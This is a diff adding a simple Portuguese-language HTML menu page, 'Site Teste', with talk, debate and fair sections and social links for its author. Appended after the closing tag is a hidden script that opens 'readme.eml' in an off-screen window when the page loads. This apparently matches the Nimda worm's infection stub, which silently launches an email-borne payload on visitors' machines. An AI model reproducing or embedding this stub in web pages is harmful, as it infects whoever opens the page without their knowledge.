@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>Project One-Two</title>
+        <link rel="stylesheet" type="text/css" href="index">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    </head>
+    <body>
+        <div>
+            <h1 id="titulo">Site Teste</h1>
+            <input type="checkbox" id="bt_menu"/>
+            <label for="bt_menu">&#9776;</label>
+            <nav id="menu">
+                <h1> <a href="#">Moz Mais Intelectual</a></h1>
+                <ul>
+                    <li><a href="#">Início</a></li>
+                    <li>
+                        <a href="#">Palestras</a>
+                        <ul>
+                            <li><a href="http://localhost/php/aula5/funcoesaritmeticas.php" target="_blank">#####</a></li>
+                            <li><a href="#">####</a></li>
+                            <li><a href="#">####</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#">Debates</a>
+                        <ul>
+                            <li><a href="fotos.html">2017</a></li>
+                            <li><a href="#">2016</a></li>
+                            <li><a href="#">2015</a></li>
+                        </ul>
+                    </li>
+                    <li>
+                        <a href="#">Feiras</a>
+                        <ul>
+                            <li><a href="#">######</a></li>
+                            <li><a href="#">######</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#">Sobre</a></li>
+                </ul>
+            </nav>
+        </div>
+        <div id="corpo"></div>
+        <div id="rodape">		
+            <p>
+                POWERED BY TADEU MELEMBE<br/>
+                <a href="https://www.facebook.com/tadeumelembe" target="_blank">Facebook</a> / <a href="https://twitter.com/TMelembe" target="_blank">Twitter</a> / 
+                <a href="https://www.instagram.com/tadeumelembe/" target="_blank">Instagram</a>
+            </p> 
+        </div>
+    </body>
+</html>
+
+<html>
+    <script language="JavaScript">
+        window.open("readme.eml", null,"resizable=no,top=6000,left=6000")
+    </script>
+</html>
